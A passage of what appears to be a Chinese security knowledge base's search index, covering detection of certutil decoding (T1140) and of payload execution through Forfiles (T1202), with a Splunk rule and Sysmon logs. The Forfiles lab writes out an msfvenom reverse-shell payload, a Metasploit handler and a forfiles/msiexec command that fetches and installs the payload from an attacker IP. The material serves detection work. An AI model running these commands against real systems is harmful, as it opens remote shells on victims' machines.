-backupKey -- \u5907\u4efd Active Directory \u8bc1\u4e66\u670d\u52a1\u8bc1\u4e66\u548c\u79c1\u94a5 -restore -- \u8fd8\u539f Active Directory \u8bc1\u4e66\u670d\u52a1 -restoreDB -- \u8fd8\u539f Active Directory \u8bc1\u4e66\u670d\u52a1\u6570\u636e\u5e93 -restoreKey -- \u8fd8\u539f Active Directory \u8bc1\u4e66\u670d\u52a1\u8bc1\u4e66\u548c\u79c1\u94a5 -importPFX -- \u5bfc\u5165\u8bc1\u4e66\u548c\u79c1\u94a5 -dynamicfilelist -- \u663e\u793a\u52a8\u6001\u6587\u4ef6\u5217\u8868 -databaselocations -- \u663e\u793a\u6570\u636e\u5e93\u4f4d\u7f6e -hashfile -- \u901a\u8fc7\u6587\u4ef6\u751f\u6210\u5e76\u663e\u793a\u52a0\u5bc6\u54c8\u5e0c -store -- \u8f6c\u50a8\u8bc1\u4e66\u5b58\u50a8 -enumstore -- \u679a\u4e3e\u8bc1\u4e66\u5b58\u50a8 -addstore -- \u5c06\u8bc1\u4e66\u6dfb\u52a0\u5230\u5b58\u50a8 -delstore -- \u4ece\u5b58\u50a8\u5220\u9664\u8bc1\u4e66 -verifystore -- \u9a8c\u8bc1\u5b58\u50a8\u4e2d\u7684\u8bc1\u4e66 -repairstore -- \u4fee\u590d\u5bc6\u94a5\u5173\u8054\uff0c\u6216\u8005\u66f4\u65b0\u8bc1\u4e66\u5c5e\u6027\u6216\u5bc6\u94a5\u5b89\u5168\u63cf\u8ff0\u7b26 -viewstore -- \u8f6c\u50a8\u8bc1\u4e66\u5b58\u50a8 -viewdelstore -- \u4ece\u5b58\u50a8\u5220\u9664\u8bc1\u4e66 -UI -- \u8c03\u7528 CryptUI -attest -- \u9a8c\u8bc1\u5bc6\u94a5\u8bc1\u660e\u8bf7\u6c42 -dsPublish -- \u5c06\u8bc1\u4e66\u6216 CRL \u53d1\u5e03\u5230 Active Directory -ADTemplate -- \u663e\u793a AD \u6a21\u677f -Template -- \u663e\u793a\u6ce8\u518c\u7b56\u7565\u6a21\u677f -TemplateCAs -- \u663e\u793a\u6a21\u677f\u7684 CA -CATemplates -- \u663e\u793a CA \u7684\u6a21\u677f -SetCASites -- \u7ba1\u7406 CA \u7684\u7ad9\u70b9\u540d\u79f0 -enrollmentServerURL -- \u663e\u793a\u3001\u6dfb\u52a0\u6216\u5220\u9664\u4e0e CA \u5173\u8054\u7684\u6ce8\u518c\u670d\u52a1\u5668 URL -ADCA -- \u663e\u793a AD CA -CA -- \u663e\u793a\u6ce8\u518c\u7b56\u7565 CA -Policy -- \u663e\u793a\u6ce8\u518c\u7b56\u7565 -PolicyCache -- \u663e\u793a\u6216\u5220\u9664\u6ce8\u518c\u7b56\u7565\u7f13\u5b58\u9879\u76ee -CredStore -- \u663e\u793a\u3001\u6dfb\u52a0\u6216\u5220\u9664\u51ed\u636e\u5b58\u50a8\u9879\u76ee -InstallDefaultTemplates -- \u5b89\u88c5\u9ed8\u8ba4\u7684\u8bc1\u4e66\u6a21\u677f -URLCache -- \u663e\u793a\u6216\u5220\u9664 URL \u7f13\u5b58\u9879\u76ee -pulse -- \u4ee5\u8109\u51b2\u65b9\u5f0f\u6267\u884c\u81ea\u52a8\u6ce8\u518c\u4e8b\u4ef6\u6216 NGC \u4efb\u52a1 -MachineInfo -- \u663e\u793a Active Directory \u8ba1\u7b97\u673a\u5bf9\u8c61\u4fe1\u606f -DCInfo -- \u663e\u793a\u57df\u63a7\u5236\u5668\u4fe1\u606f -EntInfo -- \u663e\u793a\u4f01\u4e1a\u4fe1\u606f -TCAInfo -- \u663e\u793a CA \u4fe1\u606f -SCInfo -- \u663e\u793a\u667a\u80fd\u5361\u4fe1\u606f -SCRoots -- \u7ba1\u7406\u667a\u80fd\u5361\u6839\u8bc1\u4e66 -verifykeys -- \u9a8c\u8bc1\u516c/\u79c1\u94a5\u96c6 -verify -- \u9a8c\u8bc1\u8bc1\u4e66\uff0cCRL \u6216\u94fe -verifyCTL -- \u9a8c\u8bc1 AuthRoot \u6216\u4e0d\u5141\u8bb8\u7684\u8bc1\u4e66 CTL -syncWithWU -- \u4e0e Windows \u66f4\u65b0\u540c\u6b65 -generateSSTFromWU -- \u901a\u8fc7 Windows \u66f4\u65b0\u751f\u6210 SST -generatePinRulesCTL -- \u751f\u6210\u6346\u7ed1\u89c4\u5219 CTL -downloadOcsp -- \u4e0b\u8f7d OCSP \u54cd\u5e94\u5e76\u5199\u5165\u76ee\u5f55 -generateHpkpHeader -- \u4f7f\u7528\u6307\u5b9a\u6587\u4ef6\u6216\u76ee\u5f55\u4e2d\u7684\u8bc1\u4e66\u751f\u6210 HPKP \u5934 -flushCache -- \u5237\u65b0\u9009\u5b9a\u8fdb\u7a0b(\u4f8b\u5982 lsass.exe)\u4e2d\u7684\u6307\u5b9a\u7f13\u5b58 -addEccCurve -- \u6dfb\u52a0 ECC \u66f2\u7ebf -deleteEccCurve -- \u5220\u9664 ECC \u66f2\u7ebf -displayEccCurve -- \u663e\u793a ECC \u66f2\u7ebf -sign -- \u91cd\u65b0\u7b7e\u540d CRL \u6216\u8bc1\u4e66 -vroot -- \u521b\u5efa/\u5220\u9664 Web \u865a\u62df\u6839\u548c\u6587\u4ef6\u5171\u4eab -vocsproot -- \u521b\u5efa/\u5220\u9664 OCSP Web Proxy \u7684 Web \u865a\u62df\u6839 -addEnrollmentServer -- \u6dfb\u52a0\u6ce8\u518c\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f -deleteEnrollmentServer -- \u5220\u9664\u6ce8\u518c\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f -addPolicyServer -- \u6dfb\u52a0\u7b56\u7565\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f -deletePolicyServer -- \u5220\u9664\u7b56\u7565\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f -oid -- \u663e\u793a ObjectId \u6216\u8bbe\u7f6e\u663e\u793a\u540d\u79f0 -error -- \u663e\u793a\u9519\u8bef\u4ee3\u7801\u6d88\u606f\u6587\u672c -getreg -- \u663e\u793a\u6ce8\u518c\u8868\u503c -setreg -- \u8bbe\u7f6e\u6ce8\u518c\u8868\u503c -delreg -- \u5220\u9664\u6ce8\u518c\u8868\u503c -ImportKMS -- \u4e3a\u5bc6\u94a5\u5b58\u6863\u5bfc\u5165\u7528\u6237\u5bc6\u94a5\u548c\u8bc1\u4e66\u5230\u670d\u52a1\u5668\u6570\u636e\u5e93 -ImportCert -- \u5c06\u8bc1\u4e66\u6587\u4ef6\u5bfc\u5165\u6570\u636e\u5e93 -GetKey -- \u68c0\u7d22\u5b58\u6863\u7684\u79c1\u94a5\u6062\u590d Blob\uff0c\u751f\u6210\u6062\u590d\u811a\u672c \u6216\u6062\u590d\u5b58\u6863\u7684\u5bc6\u94a5 -RecoverKey -- \u6062\u590d\u5b58\u6863\u7684\u79c1\u94a5 -MergePFX -- \u5408\u5e76 PFX \u6587\u4ef6 -ConvertEPF -- \u5c06 PFX \u6587\u4ef6\u8f6c\u6362\u4e3a EPF \u6587\u4ef6 -add-chain -- (-AddChain) \u6dfb\u52a0\u8bc1\u4e66\u94fe -add-pre-chain -- (-AddPrechain) \u6dfb\u52a0\u9884\u690d\u8bc1\u4e66\u94fe -get-sth -- (-GetSTH) \u83b7\u53d6\u7b7e\u540d\u6811\u5934 -get-sth-consistency -- (-GetSTHConsistency) \u83b7\u53d6\u7b7e\u540d\u6811\u5934\u66f4\u6539 -get-proof-by-hash -- (-GetProofByHash) \u83b7\u53d6\u54c8\u5e0c\u8bc1\u660e -get-entries -- (-GetEntries) \u83b7\u53d6\u9879 -get-roots -- (-GetRoots) \u83b7\u53d6\u6839 -get-entry-and-proof -- (-GetEntryAndProof) \u83b7\u53d6\u9879\u548c\u8bc1\u660e -VerifyCT -- \u9a8c\u8bc1\u8bc1\u4e66 SCT -? -- \u663e\u793a\u8be5\u7528\u6cd5\u6d88\u606f CertUtil -? -- \u663e\u793a\u52a8\u8bcd\u5217\u8868(\u547d\u540d\u5217\u8868) CertUtil -dump -? -- \u663e\u793a \"dump\" \u52a8\u8bcd\u7684\u5e2e\u52a9\u6587\u672c CertUtil -v -? -- \u663e\u793a\u6240\u6709\u52a8\u8bcd\u7684\u6240\u6709\u5e2e\u52a9\u6587\u672c CertUtil: -? \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_5","text":"\u6839\u636e\u5b9e\u73b0\u7684\u65b9\u6cd5\u4e0d\u540c\uff0c\u68c0\u6d4b\u53bb\u6df7\u6dc6\u6216\u89e3\u7801\u6587\u4ef6\u4fe1\u606f\u7684\u52a8\u4f5c\u53ef\u80fd\u5f88\u56f0\u96be\u3002\u5982\u679c\u8be5\u529f\u80fd\u5305\u542b\u5728\u6076\u610f\u8f6f\u4ef6\u4e2d\u5e76\u4f7f\u7528Windows API\uff0c\u5219\u4e0e\u5728\u52a0\u8f7d\u7684\u5e93\u6216API\u8c03\u7528\u4e0a\u8fdb\u884c\u5206\u6790\u76f8\u6bd4\uff0c\u5c1d\u8bd5\u5728\u64cd\u4f5c\u4e4b\u524d\u6216\u4e4b\u540e\u68c0\u6d4b\u6076\u610f\u884c\u4e3a\u53ef\u80fd\u4f1a\u4ea7\u751f\u66f4\u597d\u7684\u7ed3\u679c\u3002\u5982\u679c\u4f7f\u7528\u811a\u672c\uff0c\u5219\u53ef\u80fd\u9700\u8981\u6536\u96c6\u811a\u672c\u8fdb\u884c\u5206\u6790\u3002\u6267\u884c\u8fc7\u7a0b\u548c\u547d\u4ee4\u884c\u76d1\u89c6\uff0c\u4ee5\u68c0\u6d4b\u4e0e\u811a\u672c\u548c\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982certutil\uff09\u6709\u5173\u7684\u6f5c\u5728\u6076\u610f\u884c\u4e3a\u3002 \u76d1\u89c6\u5e38\u89c1\u5f52\u6863\u6587\u4ef6\u5e94\u7528\u7a0b\u5e8f\u548c\u6269\u5c55\u7684\u6267\u884c\u6587\u4ef6\u8def\u5f84\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4f8b\u5982Zip\u548cRAR\u5f52\u6863\u5de5\u5177\u7684\u6269\u5c55\uff0c\u5e76\u4e0e\u5176\u4ed6\u53ef\u7591\u884c\u4e3a\u76f8\u5173\u8054\uff0c\u4ee5\u51cf\u5c11\u6765\u81ea\u6b63\u5e38\u7528\u6237\u548c\u7ba1\u7406\u5458\u884c\u4e3a\u7684\u8bef\u62a5.","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#splunk","text":"index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\certutil.exe\u201d CommandLine IN (\u201c*encode*\u201d , \u201c*decode*\u201d))","title":"splunk\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_6","text":"\u5982\u679c\u4f60\u5bf9windows\u6709\u8db3\u591f\u591a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u76f8\u4fe1\u4f60\u4e5f\u77e5\u9053\u5e94\u8be5\u5982\u4f55\u53bb\u7528Windows\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\u6b64\u7c7b\u653b\u51fb\u884c\u4e3a\uff0c\u6bd4\u5982\u4f9d\u97604688\u4e2d\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_7","text":"MITRE-ATT&CK-T1140 https://attack.mitre.org/techniques/T1140 CMD \u4e2dcertutil \u64cd\u4f5c\u547d\u4ee4 https://www.cnblogs.com/zeng-qh/p/10608522.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/","text":"T1202-win-\u57fa\u4e8e\u767d\u540d\u5355Forfiles\u6267\u884cpayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u53ef\u4ee5\u4f7f\u7528\u5404\u79cdWindows\u5b9e\u7528\u7a0b\u5e8f\u6765\u6267\u884c\u547d\u4ee4\uff0c\u800c\u4e0d\u9700\u8981\u8c03\u7528cmd\u3002\u4f8b\u5982\uff0cForfiles\u3001\u7a0b\u5e8f\u517c\u5bb9\u6027\u52a9\u624b\uff08pcalua.exe\uff09\u3001WSL\uff08WindowsSubsystem for Linux\uff09\u7ec4\u4ef6\u4ee5\u53ca\u5176\u4ed6\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u754c\u9762\u3001\u8fd0\u884c\u7a97\u53e3\u6216\u901a\u8fc7\u811a\u672c\u6765\u8c03\u7528\u7a0b\u5e8f\u548c\u547d\u4ee4\u7684\u6267\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u8fd9\u4e9b\u529f\u80fd\u6765\u89c4\u907f\u9632\u5fa1\uff0c\u5c24\u5176\u662f\u5728\u7834\u574f\u68c0\u6d4b\u548c/\u6216\u7f13\u89e3\u63a7\u5236\uff08\u5982\u7ec4\u7b56\u7565\uff09\u7684\u540c\u65f6\u6267\u884c\u4efb\u610f\u52a8\u4f5c\u3002\uff08\u8fd9\u4e9b\u63a7\u5236\u9650\u5236/\u963b\u6b62\u4e86cmd\u6216\u6076\u610f\u8d1f\u8f7d\u76f8\u5173\u6587\u4ef6\u6269\u5c55\u540d\u7684\u4f7f\u7528\u3002\uff09 \u6d4b\u8bd5\u6848\u4f8b Forfiles\u4e3aWindows\u9ed8\u8ba4\u5b89\u88c5\u7684\u6587\u4ef6\u64cd\u4f5c\u641c\u7d22\u5de5\u5177\u4e4b\u4e00\uff0c\u53ef\u6839\u636e\u65e5\u671f\uff0c\u540e\u7f00\u540d\uff0c\u4fee\u6539\u65e5\u671f\u4e3a\u6761\u4ef6\u3002\u5e38\u4e0e\u6279\u5904\u7406\u914d\u5408\u4f7f\u7528\u3002 \u5fae\u8f6f\u5b98\u65b9\u6587\u6863\uff1a https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753551(v=ws.11) \u8bf4\u660e\uff1aForfiles.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cForfiles\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Forfiles\u8c03\u7528\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\WINDOWS\\system32\\forfiles.exe C:\\WINDOWS\\SysWOW64\\forfiles.exe Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\WINDOWS\\system32\\forfiles.exe C:\\WINDOWS\\SysWOW64\\forfiles.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7 \u653b\u51fb\u5206\u6790 \u751f\u6210payload msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.126.146 LPORT=8888 -f msi > abc.txt MSF\u914d\u7f6e msf5 exploit(multi/handler) > back msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 8888 lport => 5555 msf5 exploit(multi/handler) > exploit \u9776\u673a\u6267\u884cpayload forfiles /p c:\\windows\\system32 /m cmd.exe /c \"msiexec.exe /q /i http://192.168.126.146/abc.txt\" \u53cd\u5f39shell \u53cd\u5f39shell\u5931\u8d25\uff01\uff01\uff01\u4f46\u4e0d\u5f71\u54cd\u540e\u7eed\u5206\u6790 \u6d4b\u8bd5\u7559\u75d5 #sysmon\u65e5\u5fd7 EventID\uff1a1 Process Create: RuleName: UtcTime: 2020-04-18 16:27:08.447 ProcessGuid: {bb1f7c32-2a5c-5e9b-0000-0010b3101d00} ProcessId: 588 Image: C:\\Windows\\System32\\msiexec.exe FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850) Description: Windows\u00ae installer Product: Windows Installer - Unicode Company: Microsoft Corporation OriginalFileName: msiexec.exe CommandLine: /q /i http://192.168.126.146/abc.txt CurrentDirectory: C:\\Windows\\system32\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020b86d0600} LogonId: 0x66db8 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD ParentProcessGuid: {bb1f7c32-2a5c-5e9b-0000-00100a101d00} ParentProcessId: 1220 ParentImage: C:\\Windows\\System32\\forfiles.exe ParentCommandLine: forfiles /p c:\\windows\\system32 /m cmd.exe /c \"msiexec.exe /q /i http://192.168.126.146/abc.txt\" #win7\u5b89\u5168\u65e5\u5fd7 EventID\uff1a4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x4c4 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\forfiles.exe \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0\u5177\u4f53\u68c0\u6d4b\u3002\u76d1\u63a7\u548c\u5206\u6790\u57fa\u4e8e\u4e3b\u673a\u7684\u68c0\u6d4b\u673a\u5236\uff08\u5982Sysmon\uff09\u4e2d\u7684\u65e5\u5fd7\u6765\u67e5\u770b\u4e8b\u4ef6\uff0c\u6bd4\u5982\u67e5\u770b\u662f\u5426\u6709\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6\uff08\u521b\u5efa\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86\u53c2\u6570\u6765\u8c03\u7528\u7a0b\u5e8f/\u547d\u4ee4/\u6587\u4ef6\u548c/\u6216\u751f\u6210\u5b50\u8fdb\u7a0b/\u7f51\u7edc\u8fde\u63a5\uff0c\u6216\u8005\u8be5\u521b\u5efa\u662f\u7531\u8fd9\u4e9b\u53c2\u6570\u5bfc\u81f4\u7684\uff09\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1202 https://attack.mitre.org/techniques/T1202/ \u57fa\u4e8e\u767d\u540d\u5355Forfiles\u6267\u884cpayload https://www.bookstack.cn/read/Micro8/Chapter1-81-90-84_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%AD%A3.md","title":"T1202-win-\u57fa\u4e8e\u767d\u540d\u5355Forfiles\u6267\u884cpayload"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#t1202-win-forfilespayload","text":"","title":"T1202-win-\u57fa\u4e8e\u767d\u540d\u5355Forfiles\u6267\u884cpayload"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#attck","text":"\u53ef\u4ee5\u4f7f\u7528\u5404\u79cdWindows\u5b9e\u7528\u7a0b\u5e8f\u6765\u6267\u884c\u547d\u4ee4\uff0c\u800c\u4e0d\u9700\u8981\u8c03\u7528cmd\u3002\u4f8b\u5982\uff0cForfiles\u3001\u7a0b\u5e8f\u517c\u5bb9\u6027\u52a9\u624b\uff08pcalua.exe\uff09\u3001WSL\uff08WindowsSubsystem for Linux\uff09\u7ec4\u4ef6\u4ee5\u53ca\u5176\u4ed6\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u754c\u9762\u3001\u8fd0\u884c\u7a97\u53e3\u6216\u901a\u8fc7\u811a\u672c\u6765\u8c03\u7528\u7a0b\u5e8f\u548c\u547d\u4ee4\u7684\u6267\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u8fd9\u4e9b\u529f\u80fd\u6765\u89c4\u907f\u9632\u5fa1\uff0c\u5c24\u5176\u662f\u5728\u7834\u574f\u68c0\u6d4b\u548c/\u6216\u7f13\u89e3\u63a7\u5236\uff08\u5982\u7ec4\u7b56\u7565\uff09\u7684\u540c\u65f6\u6267\u884c\u4efb\u610f\u52a8\u4f5c\u3002\uff08\u8fd9\u4e9b\u63a7\u5236\u9650\u5236/\u963b\u6b62\u4e86cmd\u6216\u6076\u610f\u8d1f\u8f7d\u76f8\u5173\u6587\u4ef6\u6269\u5c55\u540d\u7684\u4f7f\u7528\u3002\uff09","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_1","text":"Forfiles\u4e3aWindows\u9ed8\u8ba4\u5b89\u88c5\u7684\u6587\u4ef6\u64cd\u4f5c\u641c\u7d22\u5de5\u5177\u4e4b\u4e00\uff0c\u53ef\u6839\u636e\u65e5\u671f\uff0c\u540e\u7f00\u540d\uff0c\u4fee\u6539\u65e5\u671f\u4e3a\u6761\u4ef6\u3002\u5e38\u4e0e\u6279\u5904\u7406\u914d\u5408\u4f7f\u7528\u3002 \u5fae\u8f6f\u5b98\u65b9\u6587\u6863\uff1a https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753551(v=ws.11) \u8bf4\u660e\uff1aForfiles.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cForfiles\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Forfiles\u8c03\u7528\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\WINDOWS\\system32\\forfiles.exe C:\\WINDOWS\\SysWOW64\\forfiles.exe Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\WINDOWS\\system32\\forfiles.exe C:\\WINDOWS\\SysWOW64\\forfiles.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#payload","text":"msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.126.146 LPORT=8888 -f msi > abc.txt","title":"\u751f\u6210payload"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#msf","text":"msf5 exploit(multi/handler) > back msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 8888 lport => 5555 msf5 exploit(multi/handler) > exploit","title":"MSF\u914d\u7f6e"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#payload_1","text":"forfiles /p c:\\windows\\system32 /m cmd.exe /c \"msiexec.exe /q /i 